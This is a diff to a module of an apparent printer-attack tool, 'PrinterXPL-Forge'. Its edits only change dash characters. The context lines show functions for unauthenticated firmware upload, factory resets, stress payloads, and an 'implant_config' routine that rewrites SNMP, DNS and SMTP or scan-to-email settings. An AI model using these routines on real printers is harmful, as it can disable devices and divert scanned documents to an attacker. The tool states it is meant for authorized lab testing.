@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PrinterXPL-Forge — Firmware & Payload Module
+PrinterXPL-Forge  -  Firmware & Payload Module
 ==========================================
 Operations targeting printer firmware, NVRAM, and embedded payloads:
 
@@ -14,7 +14,7 @@ Operations targeting printer firmware, NVRAM, and embedded payloads:
   G. Malicious payload templates for supported languages
 
 NOTE: All operations are implemented for authorized penetration testing only.
-      Firmware upload and NVRAM manipulation can brick a printer — use only
+      Firmware upload and NVRAM manipulation can brick a printer  -  use only
       in isolated lab environments on explicitly authorized targets.
 """
 
@@ -65,7 +65,7 @@ FIRMWARE_WEB_PATHS = [
     '/info', '/info.htm', '/info.html', '/status',
     '/hp/device/info', '/hp/device/InternalPages/Index',
     '/PRESENTATION/HTML/TOP/PRTINFO.HTML',
-    '/PRESENTATION/AIRPRINT/PRINTER_128.PNG',  # EPSON — check headers
+    '/PRESENTATION/AIRPRINT/PRINTER_128.PNG',  # EPSON  -  check headers
     '/cgi-bin/info.cgi', '/cgi-bin/printer.cgi',
     '/dev/info', '/sys/info',
     '/webArch/getInfo.cgi',                    # Ricoh
@@ -189,7 +189,7 @@ def check_firmware_upload(
     Test whether the printer's web interface accepts unauthenticated
     firmware upload requests.
 
-    Does NOT send actual firmware — sends a small dummy payload and
+    Does NOT send actual firmware  -  sends a small dummy payload and
     checks the HTTP response code. A 200 with 'success' or 'update'
     in the body would confirm exploitability.
 
@@ -291,7 +291,7 @@ def upload_firmware(
             auth=auth, timeout=timeout, verify=False,
         )
         if verbose:
-            print(f"  [FIRMWARE] Response: {r.status_code} — {r.text[:100]}")
+            print(f"  [FIRMWARE] Response: {r.status_code}  -  {r.text[:100]}")
         return r.status_code in (200, 201, 202, 204)
     except Exception as exc:
         _log.error("Firmware upload failed: %s", exc)
@@ -310,11 +310,11 @@ def make_payload(
 
     Args:
         lang:         'pjl', 'ps', 'pcl', 'escpr', 'pwgraster', 'pdf', 'lpd_raw'
-        payload_type: 'info'     — print device information page
-                      'stress'   — CPU/memory stress (print loop)
-                      'reset'    — factory reset the printer
-                      'network'  — print network configuration
-                      'custom'   — use *custom* string as payload body
+        payload_type: 'info'      -  print device information page
+                      'stress'    -  CPU/memory stress (print loop)
+                      'reset'     -  factory reset the printer
+                      'network'   -  print network configuration
+                      'custom'    -  use *custom* string as payload body
         custom:       Raw payload string for payload_type='custom'.
 
     Returns:
@@ -399,7 +399,7 @@ def _pcl_payload(kind: str, custom: str = '') -> bytes:
     if kind == 'info':
         return RESET + b'\x1b&l0E' + b'\x1b(s0B' + b'PrinterXPL-Forge info\r\n' + b'\x0c' + RESET
     elif kind == 'reset':
-        return RESET  # ESC E — factory defaults
+        return RESET  # ESC E  -  factory defaults
     elif kind == 'custom':
         return RESET + custom.encode('latin-1', 'replace') + b'\x0c' + RESET
     return RESET + b'\x0c' + RESET
@@ -519,9 +519,9 @@ def factory_reset(
     Attempt to trigger a factory reset on the printer.
 
     Methods:
-      'pjl'  — send @PJL INITIALIZE to port 9100 (requires PJL support)
-      'web'  — POST to known factory reset endpoints
-      'ipp'  — send IPP Restart-Printer (op 0x003B) or Deactivate-Printer
+      'pjl'   -  send @PJL INITIALIZE to port 9100 (requires PJL support)
+      'web'   -  POST to known factory reset endpoints
+      'ipp'   -  send IPP Restart-Printer (op 0x003B) or Deactivate-Printer
 
     Returns True if the command was accepted.
     """
@@ -618,7 +618,7 @@ def implant_config(
     """
     results: Dict[str, bool] = {}
 
-    # 1. SNMP SET — community strings and system info
+    # 1. SNMP SET  -  community strings and system info
     if snmp_community or dns_server:
         from protocols.storage import snmp_write
         for oid, val, label in [
@@ -631,7 +631,7 @@ def implant_config(
                 if verbose and ok:
                     print(f"  [IMPLANT] SNMP {label} set to {val!r}")
 
-    # 2. Web form — SMTP / scan-to-email redirect
+    # 2. Web form  -  SMTP / scan-to-email redirect
     if smtp_host or smtp_email:
         smtp_paths = [
             ('/hp/device/config/smtpConfig', {'smtp_server': smtp_host, 'to': smtp_email}),
@@ -707,7 +707,7 @@ def firmware_audit(
         if verbose:
             print(f"  [FIRMWARE] NVRAM read: {len(nvram_data)} bytes returned")
 
-    # Reset capability (dry test — only PJL INFO, not actual reset)
+    # Reset capability (dry test  -  only PJL INFO, not actual reset)
     try:
         from utils.ports import PortConfig as _PC
         _raw_port = _PC.resolve('raw')
